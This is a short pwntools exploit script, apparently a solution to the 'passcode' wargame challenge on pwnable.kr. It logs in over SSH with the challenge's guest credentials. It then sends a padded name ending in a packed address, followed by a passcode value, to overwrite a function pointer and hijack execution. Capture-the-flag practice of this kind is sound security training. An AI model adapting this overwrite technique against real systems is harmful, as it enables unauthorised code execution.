#!/usr/bin/python

from pwn import *

# open connection
s = ssh(host='pwnable.kr',
    user='passcode',
    port=2222,
    password='guest')
sh = s.process('./passcode')

# prepare payload
name = 'a' * 96 + p32(0x0804a004)
passcode1 = str(int("0x80485e3", 16))
print "name: ", (name)
print "passcode1: ", passcode1

# welcome
print sh.recvline()
sh.sendline(name)

#login
print sh.recvline()
sh.sendline(passcode1)

# check
print sh.recvline()
print sh.recvline()
